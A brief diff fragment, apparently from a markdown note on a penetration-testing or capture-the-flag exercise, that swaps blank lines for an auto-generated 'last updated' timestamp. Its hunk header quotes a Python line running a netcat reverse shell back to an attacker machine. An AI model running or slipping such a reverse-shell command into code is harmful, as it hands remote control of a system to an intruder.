@@ -68,11 +68,4 @@ os.system("nc -e /bin/bash $KALI 443")
 ![[Pasted image 20211229225151.png]]
 
 
-
-
-
-
-
-
-
-
+Last updated: `$= dv.current().file.mtime.toFormat("MMMM dd, yyyy 'at' HH:mm")`
